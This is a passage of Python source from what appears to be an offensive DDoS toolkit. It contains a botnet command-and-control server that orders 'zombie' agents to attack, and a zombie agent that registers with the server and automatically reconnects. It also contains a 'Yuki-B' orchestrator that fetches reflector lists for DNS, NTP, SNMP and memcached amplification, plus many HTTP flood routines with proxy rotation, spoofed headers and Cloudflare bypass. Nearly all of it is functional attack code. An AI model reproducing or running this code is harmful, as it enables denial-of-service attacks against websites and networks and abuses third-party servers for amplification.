                if zombie_id in self.zombies:
                    del self.zombies[zombie_id]
            try:
                client_sock.close()
            except:
                pass
            stdout.write(f" {Fore.RED}[C2]{Fore.WHITE} Zombie disconnected: {zombie_id}\n")
    
    def _heartbeat_monitor(self):
        """Monitor zombie health and prune dead connections."""
        while self.running:
            time.sleep(ZOMBIE_HEARTBEAT_INTERVAL)
            now = time.time()
            with self.lock:
                dead = []
                for zid, zdata in self.zombies.items():
                    if now - zdata["last_seen"] > 60:
                        dead.append(zid)
                for zid in dead:
                    try:
                        self.zombies[zid]["socket"].close()
                    except:
                        pass
                    del self.zombies[zid]
                    stdout.write(f" {Fore.RED}[C2]{Fore.WHITE} Pruned dead zombie: {zid}\n")
    
    def _command_interface(self):
        """Interactive command interface for controlling zombies."""
        while self.running:
            try:
                stdout.write(f" {Fore.LIGHTGREEN_EX}[C2]{Fore.WHITE}> ")
                cmd = input().strip()
                if not cmd:
                    continue
                elif cmd == "list":
                    with self.lock:
                        stdout.write(f" {Fore.LIGHTCYAN_EX}[C2]{Fore.WHITE} Active zombies: {len(self.zombies)}\n")
                        for zid, zdata in self.zombies.items():
                            stdout.write(f"   {zid} @ {zdata['addr'][0]}:{zdata['addr'][1]} [{zdata['status']}] OS={zdata['os']}\n")
                elif cmd == "stats":
                    with self.lock:
                        stdout.write(f" {Fore.LIGHTCYAN_EX}[C2]{Fore.WHITE} Total zombies: {len(self.zombies)}\n")
                        active = sum(1 for z in self.zombies.values() if z["status"] == "attacking")
                        stdout.write(f" {Fore.LIGHTCYAN_EX}[C2]{Fore.WHITE} Attacking: {active}\n")
                        idle = sum(1 for z in self.zombies.values() if z["status"] == "idle")
                        stdout.write(f" {Fore.LIGHTCYAN_EX}[C2]{Fore.WHITE} Idle: {idle}\n")
                elif cmd.startswith("attack "):
                    # Format: attack <target_ip> <target_port> <method> <duration> <threads>
                    parts = cmd.split()
                    if len(parts) >= 6:
                        _, target_ip, target_port, method, duration, threads = parts
                        cmd_data = json.dumps({
                            "action": "attack",
                            "target_ip": target_ip,
                            "target_port": int(target_port),
                            "method": method,
                            "duration": int(duration),
                            "threads": int(threads)
                        })
                        with self.lock:
                            for zid, zdata in self.zombies.items():
                                try:
                                    zdata["socket"].sendall(cmd_data.encode())
                                    zdata["status"] = "attacking"
                                except:
                                    pass
                        stdout.write(f" {Fore.LIGHTGREEN_EX}[C2]{Fore.WHITE} Attack command sent to all zombies\n")
                    else:
                        stdout.write(f" {Fore.RED}[C2]{Fore.WHITE} Usage: attack <ip> <port> <method> <duration> <threads>\n")
                elif cmd.startswith("attack_one "):
                    # Format: attack_one <zombie_id> <target_ip> <target_port> <method> <duration> <threads>
                    parts = cmd.split()
                    if len(parts) >= 7:
                        _, zid_target, target_ip, target_port, method, duration, threads = parts
                        cmd_data = json.dumps({
                            "action": "attack",
                            "target_ip": target_ip,
                            "target_port": int(target_port),
                            "method": method,
                            "duration": int(duration),
                            "threads": int(threads)
                        })
                        with self.lock:
                            if zid_target in self.zombies:
                                self.zombies[zid_target]["socket"].sendall(cmd_data.encode())
                                self.zombies[zid_target]["status"] = "attacking"
                                stdout.write(f" {Fore.LIGHTGREEN_EX}[C2]{Fore.WHITE} Command sent to {zid_target}\n")
                            else:
                                stdout.write(f" {Fore.RED}[C2]{Fore.WHITE} Zombie not found: {zid_target}\n")
                elif cmd == "stop":
                    cmd_data = json.dumps({"action": "stop"})
                    with self.lock:
                        for zid, zdata in self.zombies.items():
                            try:
                                zdata["socket"].sendall(cmd_data.encode())
                                zdata["status"] = "idle"
                            except:
                                pass
                    stdout.write(f" {Fore.LIGHTGREEN_EX}[C2]{Fore.WHITE} Stop command sent to all zombies\n")
                elif cmd == "help":
                    stdout.write(f" {Fore.LIGHTCYAN_EX}[C2]{Fore.WHITE} Commands:\n")
                    stdout.write(f"   list                          - List active zombies\n")
                    stdout.write(f"   stats                         - Show zombie statistics\n")
                    stdout.write(f"   attack <ip> <port> <method> <dur> <thr>  - Command all zombies to attack\n")
                    stdout.write(f"   attack_one <zid> <ip> <port> <method> <dur> <thr> - Command one zombie\n")
                    stdout.write(f"   stop                          - Stop all attacks\n")
                    stdout.write(f"   help                          - Show this help\n")
                elif cmd == "exit":
                    self.running = False
                    break
                else:
                    stdout.write(f" {Fore.RED}[C2]{Fore.WHITE} Unknown command. Type 'help'.\n")
            except EOFError:
                break
            except:
                pass

class ZombieAgent:
    """Zombie agent — connects to C2, receives and executes attack commands."""
    
    def __init__(self, c2_host="127.0.0.1", c2_port=C2_PORT):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.zombie_id = f"zombie_{socket.gethostname()}_{random.randint(1000, 9999)}"
        self.running = False
        self.attack_threads = []
    
    def start(self):
        """Start zombie agent — connect to C2 and listen for commands."""
        stdout.write(f" {Fore.LIGHTGREEN_EX}[ZOMBIE]{Fore.WHITE} Starting zombie agent: {self.zombie_id}\n")
        stdout.write(f" {Fore.LIGHTGREEN_EX}[ZOMBIE]{Fore.WHITE} Connecting to C2 @ {self.c2_host}:{self.c2_port}\n")
        self.running = True
        
        while self.running:
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(10)
                sock.connect((self.c2_host, self.c2_port))
                
                # Register with C2
                reg = json.dumps({
                    "zombie_id": self.zombie_id,
                    "os": os.name,
                    "cpu": "multi",
                    "capabilities": ["udp", "tcp", "dns_amp", "ntp_amp", "snmp_amp", "http"]
                })
                sock.sendall(reg.encode())
                stdout.write(f" {Fore.LIGHTGREEN_EX}[ZOMBIE]{Fore.WHITE} Registered with C2\n")
                
                # Listen for commands
                while self.running:
                    try:
                        data = sock.recv(4096)
                        if not data:
                            break
                        cmd = json.loads(data.decode())
                        self._execute_command(sock, cmd)
                    except socket.timeout:
                        # Send heartbeat
                        try:
                            sock.sendall(b"HEARTBEAT")
                        except:
                            break
                    except:
                        break
                
                sock.close()
            except:
                pass
            
            if self.running:
                stdout.write(f" {Fore.RED}[ZOMBIE]{Fore.WHITE} Disconnected. Reconnecting in {ZOMBIE_RECONNECT_DELAY}s...\n")
                time.sleep(ZOMBIE_RECONNECT_DELAY)
    
    def _execute_command(self, sock, cmd):
        """Execute command received from C2."""
        action = cmd.get("action", "")
        
        if action == "attack":
            target_ip = cmd.get("target_ip")
            target_port = cmd.get("target_port", 80)
            method = cmd.get("method", "udp")
            duration = cmd.get("duration", 60)
            threads = cmd.get("threads", 100)
            
            stdout.write(f" {Fore.LIGHTCYAN_EX}[ZOMBIE]{Fore.WHITE} Attack command: {method} -> {target_ip}:{target_port} for {duration}s\n")
            
            # Launch appropriate attack
            until = datetime.datetime.now() + datetime.timedelta(seconds=duration)
            
            if method == "udp":
                for _ in range(threads):
                    thd = threading.Thread(target=_udp_flood_worker, args=(target_ip, target_port, until), daemon=True)
                    thd.start()
            elif method == "tcp":
                for _ in range(threads):
                    thd = threading.Thread(target=_tcp_flood_worker, args=(target_ip, target_port, until), daemon=True)
                    thd.start()
            elif method == "dns_amp":
                # Load resolvers and attack
                resolvers = []
                for url in AMPLIFICATION_LISTS["dns"]:
                    try:
                        r = requests.get(url, timeout=10)
                        if r.status_code == 200:
                            resolvers.extend([l.strip() for l in r.text.split('\n') if l.strip()])
                    except:
                        pass
                resolvers = list(set(resolvers))
                if resolvers:
                    for _ in range(threads):
                        thd = threading.Thread(target=_dns_amp_worker, args=(target_ip, resolvers, until), daemon=True)
                        thd.start()
            elif method == "ntp_amp":
                servers = []
                for url in AMPLIFICATION_LISTS["ntp"]:
                    try:
                        r = requests.get(url, timeout=10)
                        if r.status_code == 200:
                            servers.extend([l.strip() for l in r.text.split('\n') if l.strip()])
                    except:
                        pass
                servers = list(set(servers))
                if servers:
                    for _ in range(threads):
                        thd = threading.Thread(target=_ntp_amp_worker, args=(target_ip, servers, until), daemon=True)
                        thd.start()
            elif method == "yuki_b":
                # Full multi-vector attack
                run_multi_udp(target_ip, target_port, threads, duration)
            
            try:
                sock.sendall(f"ACK: Attack launched - {method} -> {target_ip}:{target_port}".encode())
            except:
                pass
        
        elif action == "stop":
            stdout.write(f" {Fore.RED}[ZOMBIE]{Fore.WHITE} Stop command received\n")
            # Threads are daemon, they'll die when main exits
            try:
                sock.sendall(b"ACK: Stopping attacks")
            except:
                pass

def start_c2_server():
    """Start the C2 server interactively."""
    stdout.write(f"\n {Fore.LIGHTGREEN_EX}╔══════════════════════════════════════╗\n")
    stdout.write(f" {Fore.LIGHTGREEN_EX}║      ZOMBIE C2 — COMMAND CENTER      ║\n")
    stdout.write(f" {Fore.LIGHTGREEN_EX}╚══════════════════════════════════════╝\n")
    stdout.write(f" {Fore.MAGENTA}[*]{Fore.WHITE} Enter C2 listen port [{C2_PORT}]: ")
    port_input = input().strip()
    port = int(port_input) if port_input else C2_PORT
    
    server = C2Server(port=port)
    server.start()

def start_zombie_agent():
    """Start zombie agent interactively."""
    stdout.write(f"\n {Fore.LIGHTGREEN_EX}╔══════════════════════════════════════╗\n")
    stdout.write(f" {Fore.LIGHTGREEN_EX}║      ZOMBIE AGENT — CONNECTING       ║\n")
    stdout.write(f" {Fore.LIGHTGREEN_EX}╚══════════════════════════════════════╝\n")
    stdout.write(f" {Fore.MAGENTA}[*]{Fore.WHITE} Enter C2 host [127.0.0.1]: ")
    host = input().strip() or "127.0.0.1"
    stdout.write(f" {Fore.MAGENTA}[*]{Fore.WHITE} Enter C2 port [{C2_PORT}]: ")
    port_input = input().strip()
    port = int(port_input) if port_input else C2_PORT
    
    agent = ZombieAgent(c2_host=host, c2_port=port)
    agent.start()

# ═══════════════════════════════════════════════════════════════════════════
# YUKI-B TAKEDOWN ORCHESTRATOR
# ═══════════════════════════════════════════════════════════════════════════

def run_yuki_b(target_ip, target_port, threads, duration):
    """
    Yuki-B Takedown Attack — full-spectrum multi-vector assault.
    Combines every Layer 4 UDP vector simultaneously for maximum impact.
    """
    stdout.write(f"\n {Fore.RED}╔══════════════════════════════════════════════════╗\n")
    stdout.write(f" {Fore.RED}║         YUKI-B MASSIVE TAKEDOWN ATTACK           ║\n")
    stdout.write(f" {Fore.RED}╚══════════════════════════════════════════════════╝\n")
    stdout.write(f" {Fore.MAGENTA}[*]{Fore.WHITE} Target: {target_ip}:{target_port}\n")
    stdout.write(f" {Fore.MAGENTA}[*]{Fore.WHITE} Duration: {duration}s\n")
    stdout.write(f" {Fore.MAGENTA}[*]{Fore.WHITE} Threads: {threads}\n")
    stdout.write(f" {Fore.MAGENTA}[*]{Fore.WHITE} Vectors: UDP + DNS-AMP + NTP-AMP + SNMP-AMP + MEMC-AMP + CHARGEN + TCP\n\n")
    
    # Distribute threads across vectors
    udp_threads = threads // 3
    amp_threads = threads // 6
    tcp_threads = threads // 3
    chargen_threads = threads - (udp_threads + amp_threads * 4 + tcp_threads)
    
    stdout.write(f" {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} UDP Flood threads: {udp_threads}\n")
    stdout.write(f" {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} DNS Amp threads: {amp_threads}\n")
    stdout.write(f" {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} NTP Amp threads: {amp_threads}\n")
    stdout.write(f" {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} SNMP Amp threads: {amp_threads}\n")
    stdout.write(f" {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} Memcached Amp threads: {amp_threads}\n")
    stdout.write(f" {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} TCP Flood threads: {tcp_threads}\n")
    stdout.write(f" {Fore.LIGHTCYAN_EX}[*]{Fore.WHITE} Chargen threads: {chargen_threads}\n\n")
    
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(duration))
    
    # Load amplification servers
    amp_servers = {}
    for amp_type, urls in AMPLIFICATION_LISTS.items():
        servers = []
        for url in urls:
            try:
                stdout.write(f"  {Fore.MAGENTA}[*]{Fore.WHITE} Loading {amp_type} servers from {url[:50]}...\n")
                r = requests.get(url, timeout=15)
                if r.status_code == 200:
                    servers.extend([l.strip() for l in r.text.split('\n') if l.strip()])
            except:
                pass
        amp_servers[amp_type] = list(set(servers))
        stdout.write(f"  {Fore.LIGHTGREEN_EX}[*]{Fore.WHITE} {amp_type}: {len(amp_servers[amp_type])} servers loaded\n")
    
    stdout.write(f"\n {Fore.RED}[*]{Fore.WHITE} LAUNCHING ALL VECTORS NOW...\n\n")
    
    # Launch UDP flood
    for _ in range(udp_threads):
        threading.Thread(target=_udp_flood_worker, args=(target_ip, int(target_port), until), daemon=True).start()
    
    # Launch DNS amplification
    if amp_servers.get("dns"):
        for _ in range(amp_threads):
            threading.Thread(target=_dns_amp_worker, args=(target_ip, amp_servers["dns"], until), daemon=True).start()
    
    # Launch NTP amplification
    if amp_servers.get("ntp"):
        for _ in range(amp_threads):
            threading.Thread(target=_ntp_amp_worker, args=(target_ip, amp_servers["ntp"], until), daemon=True).start()
    
    # Launch SNMP amplification
    if amp_servers.get("snmp"):
        for _ in range(amp_threads):
            threading.Thread(target=_snmp_amp_worker, args=(target_ip, amp_servers["snmp"], until), daemon=True).start()
    
    # Launch Memcached amplification
    if amp_servers.get("memcached"):
        for _ in range(amp_threads):
            threading.Thread(target=_memc_amp_worker, args=(target_ip, amp_servers["memcached"], until), daemon=True).start()
    
    # Launch Chargen
    for _ in range(max(1, chargen_threads)):
        threading.Thread(target=_chargen_amp_worker, args=(target_ip, until, b'X'), daemon=True).start()
    
    # Launch TCP flood
    for _ in range(tcp_threads):
        threading.Thread(target=_tcp_flood_worker, args=(target_ip, int(target_port), until), daemon=True).start()
    
    stdout.write(f" {Fore.LIGHTGREEN_EX}[*]{Fore.WHITE} All vectors launched. Attack running for {duration}s.\n")

# ═══════════════════════════════════════════════════════════════════════════
# LAYER 7 ATTACK METHODS (Fixed & Cleaned)
# ═══════════════════════════════════════════════════════════════════════════

def LaunchHEAD(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackHEAD, args=(url, until), daemon=True)
            thd.start()
        except:
            pass

def AttackHEAD(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.head(url, timeout=5)
            requests.head(url, timeout=5)
        except:
            pass

def LaunchPOST(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPOST, args=(url, until), daemon=True)
            thd.start()
        except:
            pass

def AttackPOST(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.post(url, timeout=5)
            requests.post(url, timeout=5)
        except:
            pass

def LaunchRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackRAW, args=(url, until), daemon=True)
            thd.start()
        except:
            pass

def AttackRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            requests.get(url, timeout=5)
            requests.get(url, timeout=5)
        except:
            pass

def LaunchPXRAW(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXRAW, args=(url, until), daemon=True)
            thd.start()
        except:
            pass

def AttackPXRAW(url, until_datetime):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = random.choice(proxies) if proxies else None
            if proxy:
                p = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                requests.get(url, proxies=p, timeout=5)
                requests.get(url, proxies=p, timeout=5)
        except:
            pass

def LaunchPXSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\n"
    req += "Host: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPXSOC, args=(target, until, req), daemon=True)
            thd.start()
        except:
            pass

def AttackPXSOC(target, until_datetime, req):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            proxy = random.choice(proxies).split(":") if proxies else None
            if not proxy or len(proxy) < 2:
                continue
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.settimeout(5)
            s.connect((str(target['host']), int(target['port'])))
            if target['scheme'] == 'https':
                ctx = _create_compat_tls_context()
                s = ctx.wrap_socket(s, server_hostname=target['host'])
            try:
                for _ in range(9999):
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            pass

def LaunchSOC(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSOC, args=(target, until, req), daemon=True)
            thd.start()
        except:
            pass

def AttackSOC(target, until_datetime, req):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            s.connect((str(target['host']), int(target['port'])))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            s.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                for _ in range(9999):
                    s.send(str.encode(req))
            except:
                s.close()
                return
    except:
        pass

def LaunchPPS(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackPPS, args=(target, until), daemon=True)
            thd.start()
        except:
            pass

def AttackPPS(target, until_datetime):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            s.connect((str(target['host']), int(target['port'])))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            s.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                for _ in range(9999):
                    s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            except:
                s.close()
                return
    except:
        pass

def LaunchNULL(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: null\r\n"
    req += "Referrer: null\r\n"
    req += spoof(target) + "\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackNULL, args=(target, until, req), daemon=True)
            thd.start()
        except:
            pass

def AttackNULL(target, until_datetime, req):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            s.connect((str(target['host']), int(target['port'])))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            s.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                for _ in range(9999):
                    s.send(str.encode(req))
            except:
                s.close()
                return
    except:
        pass

def LaunchSPOOF(url, th, t):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackSPOOF, args=(target, until, req), daemon=True)
            thd.start()
        except:
            pass

def AttackSPOOF(target, until_datetime, req):
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            s.connect((str(target['host']), int(target['port'])))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.settimeout(5)
            s.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                for _ in range(9999):
                    s.send(str.encode(req))
            except:
                s.close()
                return
    except:
        pass

def LaunchPXSPOOF(url, th, t, proxy_list):
    target = get_target(url)
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    req = "GET " + target['uri'] + " HTTP/1.1\r\nHost: " + target['host'] + "\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\n"
    req += spoof(target)
    req += "Connection: Keep-Alive\r\n\r\n"
    for _ in range(int(th)):
        try:
            randomproxy = random.choice(proxy_list)
            thd = threading.Thread(target=AttackPXSPOOF, args=(target, until, req, randomproxy), daemon=True)
            thd.start()
        except:
            pass

def AttackPXSPOOF(target, until_datetime, req, proxy):
    proxy_parts = proxy.split(":")
    if len(proxy_parts) < 2:
        return
    try:
        if target['scheme'] == 'https':
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy_parts[0]), int(proxy_parts[1]))
            s.settimeout(5)
            s.connect((str(target['host']), int(target['port'])))
            ctx = _create_compat_tls_context()
            s = ctx.wrap_socket(s, server_hostname=target['host'])
        else:
            s = socks.socksocket()
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.set_proxy(socks.SOCKS5, str(proxy_parts[0]), int(proxy_parts[1]))
            s.settimeout(5)
            s.connect((str(target['host']), int(target['port'])))
    except:
        return
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            for _ in range(9999):
                s.send(str.encode(req))
        except:
            s.close()
            return

# ─── Cloudflare Bypass Methods ────────────────────────────────────────────

def LaunchCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            scraper = cloudscraper.create_scraper()
            thd = threading.Thread(target=AttackCFB, args=(url, until, scraper), daemon=True)
            thd.start()
        except:
            pass

def AttackCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.post(url, timeout=30)
            scraper.get(url, timeout=30)
        except:
            pass

def LaunchPXCFB(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    for _ in range(int(th)):
        try:
            scraper = cloudscraper.create_scraper()
            thd = threading.Thread(target=AttackPXCFB, args=(url, until, scraper), daemon=True)
            thd.start()
        except:
            pass

def AttackPXCFB(url, until_datetime, scraper):
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            if proxies:
                proxy = random.choice(proxies)
                p = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
                scraper.get(url, proxies=p, timeout=30)
                scraper.get(url, proxies=p, timeout=30)
        except:
            pass

def LaunchCFPRO(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    session = requests.Session()
    scraper = cloudscraper.create_scraper(sess=session)
    if cookieJAR:
        jar = RequestsCookieJar()
        jar.set(cookieJAR['name'], cookieJAR['value'])
        scraper.cookies = jar
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFPRO, args=(url, until, scraper), daemon=True)
            thd.start()
        except:
            pass

def AttackCFPRO(url, until_datetime, scraper):
    headers = {
        'User-Agent': useragent or 'Mozilla/5.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
        'Accept-Language': 'en-US,en;q=0.9',
        'Accept-Encoding': 'deflate, gzip;q=1.0, *;q=0.5',
        'Cache-Control': 'no-cache',
        'Pragma': 'no-cache',
        'Connection': 'keep-alive',
        'Upgrade-Insecure-Requests': '1',
    }
    while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
        try:
            scraper.get(url=url, headers=headers, allow_redirects=False, timeout=30)
            scraper.get(url=url, headers=headers, allow_redirects=False, timeout=30)
        except:
            pass

def LaunchCFSOC(url, th, t):
    until = datetime.datetime.now() + datetime.timedelta(seconds=int(t))
    target = get_target(url)
    req = 'GET ' + target['uri'] + ' HTTP/1.1\r\n'
    req += 'Host: ' + target['host'] + '\r\n'
    req += 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n'
    req += 'Accept-Encoding: gzip, deflate, br\r\n'
    req += 'Accept-Language: ko,ko-KR;q=0.9,en-US;q=0.8,en;q=0.7\r\n'
    req += 'Cache-Control: max-age=0\r\n'
    if cookie:
        req += 'Cookie: ' + cookie + '\r\n'
    req += 'Connection: Keep-Alive\r\n'
    req += 'User-Agent: ' + (useragent or 'Mozilla/5.0') + '\r\n\r\n\r\n'
    for _ in range(int(th)):
        try:
            thd = threading.Thread(target=AttackCFSOC, args=(until, target, req), daemon=True)
            thd.start()
        except:
            pass

def AttackCFSOC(until_datetime, target, req):
    try:
        if target['scheme'] == 'https':
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.settimeout(5)
            packet.connect((str(target['host']), int(target['port'])))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            packet = ctx.wrap_socket(packet, server_hostname=target['host'])
        else:
            packet = socks.socksocket()
            packet.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            packet.settimeout(5)
            packet.connect((str(target['host']), int(target['port'])))
        while (until_datetime - datetime.datetime.now()).total_seconds() > 0:
            try:
                for _ in range(9999):
                    packet.send(str.encode(req))
            except:
                packet.close()
                return
    except:
        pass

# ─── Sky / Stellar Methods ────────────────────────────────────────────────

def attackSKY(url, timer, threads):
    target = get_target(url)
    for i in range(int(threads)):
        threading.Thread(target=LaunchSKY, args=(url, timer, target), daemon=True).start()

def LaunchSKY(url, timer, target):
    if not proxies:
        return
    proxy = random.choice(proxies).strip().split(":")
    if len(proxy) < 2:
        return
    timelol = time.time() + int(timer)
    req = "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socks.socksocket()
            s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.settimeout(5)
            s.connect((str(urlparse(url).netloc), 443))
            ctx = _create_compat_tls_context()
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(9999):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                pass
        except:
            try:
                s.close()
            except:
                pass

def attackSTELLAR(url, timer, threads):
    for i in range(int(threads)):
        threading.Thread(target=LaunchSTELLAR, args=(url, timer), daemon=True).start()

def LaunchSTELLAR(url, timer):
    timelol = time.time() + int(timer)
    req = "GET / HTTP/1.1\r\nHost: " + urlparse(url).netloc + "\r\n"
    req += "Cache-Control: no-cache\r\n"
    req += "User-Agent: " + random.choice(ua) + "\r\n"
    req += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8\r\n"
    req += "Connection: Keep-Alive\r\n\r\n"
    while time.time() < timelol:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(5)
            s.connect((str(urlparse(url).netloc), 443))
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(s, server_hostname=urlparse(url).netloc)
            s.send(str.encode(req))
            try:
                for _ in range(9999):
                    s.send(str.encode(req))
                    s.send(str.encode(req))
            except:
                s.close()
        except:
            try:
                s.close()
            except:
                pass

# ─── HTTP/2 Methods ───────────────────────────────────────────────────────

